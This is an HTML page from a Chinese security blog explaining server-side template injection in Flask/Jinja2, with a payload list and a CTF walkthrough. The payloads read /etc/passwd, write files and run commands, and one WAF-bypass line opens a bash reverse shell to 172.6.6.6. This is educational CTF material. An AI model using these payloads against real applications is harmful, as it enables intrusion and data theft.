@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html  lang="zh-cn" >
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#fff" id="theme-color">
+  <meta name="description" content="Husins">
+  <link rel="icon" href="/img/dog.jpg">
+  <title>浅析SSTI漏洞</title>
+  
+  
+  <meta property="og:title" content="浅析SSTI漏洞">
+  
+  
+  <meta property="og:url" content="https://husins.cn/%E6%B5%85%E6%9E%90SSTI%E6%BC%8F%E6%B4%9E/index.html">
+  
+  
+  <meta property="og:img" content="/img/dog.png">
+  
+  
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:published_time" content="2021-01-26">
+  <meta property="og:article:modified_time" content="2021-01-26">
+  <meta property="og:article:author" content="Husins">
+  
+  
+  <meta property="og:article:tag" content="SSTI">
+  
+  
+  
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+    var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+      }
+    };
+    setDarkmode();
+  </script>
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+  </script>
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+  <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+  <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+
+  
+  
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+
+  
+  
+<link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div class="wrapper">
+    
+    <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+      <img class="navbar-logo-img" src="/img/dog.jpg" alt="logo">
+      
+      <span class="navbar-logo-dsc">Husins Blogs</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+    <a href="/" class="navbar-menu-item">
+    
+    主页
+    
+    </a>
+    
+    <a href="/categories" class="navbar-menu-item">
+    
+    分类
+    
+    </a>
+    
+    <a href="/tags" class="navbar-menu-item">
+    
+    标签
+    
+    </a>
+    
+    <a href="/about" class="navbar-menu-item">
+    
+    关于我
+    
+    </a>
+    
+    <a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i></a>
+    <a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size: 1.2rem; font-weight: 400;"></i></a>
+  </div>
+</nav>
+    
+    <div id="local-search" style="display: none;">
+      <input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容...">
+      <div id="search-content"></div>
+    </div>
+    
+    <div class="section-wrap">
+      <div class="container">
+        <div class="columns">
+          <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      浅析SSTI漏洞
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-01-26T07:07:00.000Z">
+      <i class="iconfont icon-calendar" style="margin-right: 2px;"></i>
+      <span>2021-01-26</span>
+    </time>
+    
+    <span class="dot"></span>
+    
+    <a href="/categories/漏洞总结/" class="post-meta-link">漏洞总结</a>
+    
+    
+    
+    <span class="dot"></span>
+    <span>2.6k words</span>
+    
+  </div>
+  
+  <div class="post-meta post-show-meta" style="margin-top: -10px;">
+    <div style="display: flex; align-items: center;">
+      <i class="iconfont icon-biaoqian" style="margin-right: 2px; font-size: 1.15rem;"></i>
+      
+      
+        <a href="/tags/SSTI/" class="post-meta-link">SSTI</a>
+      
+    </div>
+  </div>
+  
+  </header>
+  <div id="section" class="post-content">
+    <h1 id="python-flask-ssti-模版注入漏洞"><a href="#python-flask-ssti-模版注入漏洞" class="headerlink" title="python-flask-ssti(模版注入漏洞)"></a>python-flask-ssti(模版注入漏洞)</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。</p>
+<p>模板注入和SQL注入很像，都是用户输入被当做代码执行（因此，“用户的输入都是不可信的”）这句话整的很实用。</p>
+<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h4 id="1-运行一个一个最小的-Flask-应用"><a href="#1-运行一个一个最小的-Flask-应用" class="headerlink" title="1.运行一个一个最小的 Flask 应用"></a>1.运行一个一个最小的 Flask 应用</h4><pre><code><pre class="highlight"><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br>app = Flask(__name__)<br><span class="hljs-string">&quot;&quot;&quot;第一部分，初始化：所有的Flask都必须创建程序实例，</span><br><span class="hljs-string">web服务器使用wsgi协议，把客户端所有的请求都转发给这个程序实例</span><br><span class="hljs-string">程序实例是Flask的对象，一般情况下用如下方法实例化</span><br><span class="hljs-string">Flask类只有一个必须指定的参数，即程序主模块或者包的名字，__name__是系统变量，该变量指的是本py文件的文件名`&quot;&quot;&quot;</span>`<br><br><span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_world</span>():</span><br>    <span class="hljs-keyword">return</span> __name__<br><span class="hljs-comment">#  第二部分，路由和视图函数：</span><br><span class="hljs-comment">#  客户端发送url给web服务器，web服务器将url转发给flask程序实例，程序实例</span><br><span class="hljs-comment">#  需要知道对于每一个url请求启动那一部分代码，所以保存了一个url和python函数的映射关系。</span><br><span class="hljs-comment">#  处理url和函数之间关系的程序，称为路由</span><br><span class="hljs-comment">#  在flask中，定义路由最简便的方式，是使用程序实例的app.route装饰器，把装饰的函数注册为路由 </span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    print(<span class="hljs-string">&#x27;dd&#x27;</span>,__name__)<br>    app.run()<br><span class="hljs-comment">#  第三部分：程序实例用run方法启动flask集成的开发web服务器</span><br><span class="hljs-comment">#  __name__ == &#x27;__main__&#x27;是python常用的方法，表示只有直接启动本脚本时候，才用app.run方法</span><br><span class="hljs-comment">#  如果是其他脚本调用本脚本，程序假定父级脚本会启用不同的服务器，因此不用执行app.run()</span><br><span class="hljs-comment">#  服务器启动后，会启动轮询，等待并处理请求。轮询会一直请求，直到程序停止。</span><br></code></pre></code></pre>
+<ul>
+<li><strong>如上述代码所示，app是flask的实例，功能就是接受来自web服务器的请求</strong>，</li>
+</ul>
+<ol>
+<li><p>浏览器将请求给web服务器，web服务器将请求给app ,</p>
+</li>
+<li><p>app收到请求，通过路由找到对应的视图函数，然后将请求处理，得到一个响应response</p>
+</li>
+<li><p>然后app将响应返回给web服务器，</p>
+</li>
+<li><p>web服务器返回给浏览器，</p>
+</li>
+<li><p>浏览器展示给用户观看，流程完毕。</p>
+<h4 id="2-jinja2"><a href="#2-jinja2" class="headerlink" title="2.jinja2"></a>2.jinja2</h4><pre class="highlight"><code class="hljs c">jnja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。<br></code></pre>
+
+<p>​        <strong>jinja2 存在着三种特殊的语句</strong>：</p>
+<ol>
+<li><p><code>&#123;%   %&#125;</code>：控制结构。</p>
+</li>
+<li><p><code>&#123;&#123;   &#125;&#125;</code>：变量取值。<strong>被两个括号包裹的内容会输出其表达式的值</strong></p>
+</li>
+<li><p><code>&#123;#     #&#125;</code>：注释。</p>
+<p>jinja2模板中使用<code>&#123;&#123;   &#125;&#125;</code>语法表示一个变量，他是一种特殊的占位符。当利用jinja2进行渲染时，他会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的python数据类型。</p>
+<p><strong>jinja2中的过滤器：</strong></p>
+<p>变量名后面加一根竖线，再跟上过滤器的名字就能使用特定的过滤器修改变量了。</p>
+<p><img src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201021175353715.png" alt="image-20201021175353715" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\17791\AppData\Roaming\Typora\typora-user-images\image-20201021175353715.png" class="lozad post-image"></p>
+</li>
+</ol>
+<p>safe 过滤器值得特别说明一下。默认情况下，出于安全考虑， Jinja2 会转义所有变量。很多情况下需要显示变量中存储的 HTML 代码，这时就可使用 safe 过滤器。</p>
+<p><strong>inja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。</strong></p>
+<h4 id="3-python魔法函数"><a href="#3-python魔法函数" class="headerlink" title="3.python魔法函数"></a>3.python魔法函数</h4><p>​    Python内置的以双下划线开头并以双下划线结尾的函数（不能自己定义，没有用），如_等很多，用于实现并定制很多特性，非常灵活，且是隐式调用的。　</p>
+<p>​    魔法函数会直接影响到Python语法本身，如让类变成可迭代的对象，也会影响Python的一些内置函数的调用，如实现<strong>len</strong>()能对对象调用len()方法。</p>
+<p>常用的魔法函数：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/small-office/p/9337297.html">https://www.cnblogs.com/small-office/p/9337297.html</a></p>
+<h4 id="4-python中的object"><a href="#4-python中的object" class="headerlink" title="4.python中的object"></a>4.python中的object</h4><p>​    在python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，这是两种创建object的方法</p>
+<p>Python中一些常见的特殊方法：</p>
+<pre class="highlight"><code class="hljs markdown"><span class="hljs-strong">__class__</span>返回调用的参数类型。<br><span class="hljs-strong">__base__</span>返回基类<br><span class="hljs-strong">__mro__</span>允许我们在当前Python环境下追溯继承树<br><span class="hljs-strong">__subclasses__</span>()返回子类<br></code></pre>
+
+<p>　</p>
+</li>
+</ol>
+<p>   ​    </p>
+<h1 id="ssti漏洞检测"><a href="#ssti漏洞检测" class="headerlink" title="ssti漏洞检测"></a>ssti漏洞检测</h1><p>   检测到模板注入漏洞后，需要准确识别模板引擎的类型。神器Burpsuite 自带检测功能，并对不同模板接受的 payload 做了一个分类，并以此快速判断模板引擎：</p>
+<p>   <img src="https://img2018.cnblogs.com/blog/1275435/201903/1275435-20190304230146045-1430183232.png" alt="img" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://img2018.cnblogs.com/blog/1275435/201903/1275435-20190304230146045-1430183232.png" class="lozad post-image"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h5 id="1-payload原理"><a href="#1-payload原理" class="headerlink" title="1.payload原理"></a>1.payload原理</h5><p>​    ·Jinja2 模板中可以访问一些 Python 内置变量，如[] {} 等，并且能够使用 Python 变量类型中的一些函数。加上python中的魔术方法，object类中的基本方法。结合这几个 我们可以 实现任意代码的执行。</p>
+<p><strong>2.payload具体思路</strong></p>
+<pre class="highlight"><code class="hljs css">现在我们的思路就是从一个内置变量调用__<span class="hljs-selector-tag">class__</span><span class="hljs-selector-class">.base__</span>等隐藏属性，去找到一个函数，然后调用其__<span class="hljs-selector-tag">globals</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;builtins&#x27;</span>]</span>即可调用<span class="hljs-selector-tag">eval</span>等执行任意代码。<br></code></pre>
+
+<p><strong>builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</strong></p>
+<pre class="highlight"><code class="hljs python"> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()<br><span class="hljs-comment"># 返回子类的列表 [,,,...]</span><br><br><span class="hljs-comment">#从中随便选一个类,查看它的__init__</span><br> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">30</span>].__init__<br>slot wrapper <span class="hljs-string">&#x27;__init__&#x27;</span> of <span class="hljs-string">&#x27;object&#x27;</span> objects<br><span class="hljs-comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><br><span class="hljs-comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">5</span>].__init__<br><br> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">5</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>]<br><span class="hljs-comment">#然后用eval执行命令即可</span><br></code></pre>
+
+<h1 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h1><h4 id="python2："><a href="#python2：" class="headerlink" title="python2："></a>python2：</h4><p>​    <strong>文件的写入和读取</strong></p>
+<pre class="highlight"><code class="hljs python"><span class="hljs-comment">#读文件</span><br>&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  <br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment">#写文件</span><br>&#123;&#123; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp/1&#x27;</span>).write(<span class="hljs-string">&quot;&quot;</span>) &#125;&#125;<br></code></pre>
+
+<p>​    <strong>任意执行</strong></p>
+<p>​    每次执行都要先写然后编译执行</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;code&#x27;</span>)&#125;&#125;  <br>&#123;&#123; config.from_pyfile(<span class="hljs-string">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125;  <br></code></pre>
+
+<p>​    写入一次</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp/owned.cfg&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>)&#125;&#125;  <br>&#123;&#123; config.from_pyfile(<span class="hljs-string">&#x27;/tmp/owned.cfg&#x27;</span>) &#125;&#125;  <br>&#123;&#123; config[<span class="hljs-string">&#x27;RUNCMD&#x27;</span>](<span class="hljs-string">&#x27;/usr/bin/id&#x27;</span>,shell=<span class="hljs-literal">True</span>) &#125;&#125;    <br></code></pre>
+
+<p>​    不回显的</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;1+1&#x27;</span>)&#125;&#125;<br>&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;<br></code></pre>
+
+<p>​    任意执行只需要一条指令</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  <br><br>&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;(system函数换为popen(<span class="hljs-string">&#x27;&#x27;</span>).read()，需要导入os模块)  <br>&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)<br></code></pre>
+
+<p>​    总结</p>
+<pre class="highlight"><code class="hljs python">通过某种类型(字符串:<span class="hljs-string">&quot;&quot;</span>，<span class="hljs-built_in">list</span>:[]，<span class="hljs-built_in">int</span>：<span class="hljs-number">1</span>)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用<span class="hljs-built_in">object</span>找到能利用的类。还有就是&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。<br></code></pre>
+
+<h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p>​        因为python3没有file了，所以用的是open</p>
+<p>​        文件读取</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">75</span>].__init__.__globals__.__builtins__[%<span class="hljs-number">27</span><span class="hljs-built_in">open</span>%<span class="hljs-number">27</span>](%<span class="hljs-number">27</span>/etc/passwd%<span class="hljs-number">27</span>).read()&#125;&#125;<br></code></pre>
+
+<p>​        任意执行</p>
+<pre class="highlight"><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">75</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre>
+
+<p>​        命令执行</p>
+<pre class="highlight"><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre>
+
+<p>​        </p>
+<h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><pre class="highlight"><code class="hljs python">python2：<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">76</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__()[<span class="hljs-number">60</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__()[<span class="hljs-number">61</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__()[<span class="hljs-number">40</span>](filename).read()<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__()[<span class="hljs-number">29</span>].__call__(<span class="hljs-built_in">eval</span>,<span class="hljs-string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)<br>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__getattribute__(<span class="hljs-string">&#x27;func_global&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>](<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;&#x27;</span>)<br><br>python3：<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>]<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__()[<span class="hljs-number">117</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>]<br>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__getattribute__(<span class="hljs-string">&#x27;__global&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>)[<span class="hljs-string">&#x27;os&#x27;</span>].__dict__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre>
+
+<h1 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h1><p><strong>题目：攻防世界之Web_python_template_injection</strong></p>
+<p><strong>连接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1</a></strong></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sXH400"><img src="https://s3.ax1x.com/2021/01/26/sXH400.png" alt="sXH400.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXH400.png" class="lozad post-image"></a></p>
+<p>打开题目提示存在 python 的模板注入</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sXHOXR"><img src="https://s3.ax1x.com/2021/01/26/sXHOXR.png" alt="sXHOXR.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXHOXR.png" class="lozad post-image"></a></p>
+<p>传参之后页面报错 但是输入的参数 a和x 已经被成功输入。</p>
+<p>.访问<code>http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D</code>,来查看所有模块</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sXHjn1"><img src="https://s3.ax1x.com/2021/01/26/sXHjn1.png" alt="sXHjn1.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXHjn1.png" class="lozad post-image"></a></p>
+<p>3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p>
+<p>4.访问<code>http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D</code>,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sXbi1H"><img src="https://s3.ax1x.com/2021/01/26/sXbi1H.png" alt="sXbi1H.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXbi1H.png" class="lozad post-image"></a></p>
+<p>5.使用<code>[&#39;o&#39;+&#39;s&#39;]</code>,可绕过对os字符的过滤，访问<code>http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D</code>查看flag文件所在</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/sXbkjA"><img src="https://s3.ax1x.com/2021/01/26/sXbkjA.png" alt="sXbkjA.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXbkjA.png" class="lozad post-image"></a></p>
+<p>6.访问<a target="_blank" rel="noopener" href="https://imgchr.com/i/sXbVBt"><img src="https://s3.ax1x.com/2021/01/26/sXbVBt.png" alt="sXbVBt.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.ax1x.com/2021/01/26/sXbVBt.png" class="lozad post-image"></a></p>
+
+  </div>
+  <div>
+  
+  <div class="post-note note-warning copyright" style="margin-top: 42px">
+    <p><span style="font-weight: bold;">作者：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/about">Husins</a></p>
+    <p><span style="font-weight: bold;">文章链接：</span><a target="_blank" rel="nofollow noopener noreferrer" href="https://husins.cn/%E6%B5%85%E6%9E%90SSTI%E6%BC%8F%E6%B4%9E/">https://husins.cn/%E6%B5%85%E6%9E%90SSTI%E6%BC%8F%E6%B4%9E/</a></p>
+    <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+  </div>
+  
+  </div>
+</article>
+<div class="nav">
+  
+  <div class="nav-item-prev">
+    <a href="/BUUCTF之-HCTF-2018-admin/" class="nav-link">
+      <i class="iconfont icon-left nav-prev-icon"></i>
+      <div>
+        <div class="nav-label">Prev</div>
+        
+        <div class="nav-title">BUUCTF之[HCTF 2018]admin </div>
+        
+      </div>
+    </a>
+  </div>
+  
+  
+  <div class="nav-item-next">
+    <a href="/浅析SSRF/" class="nav-link">
+      <div>
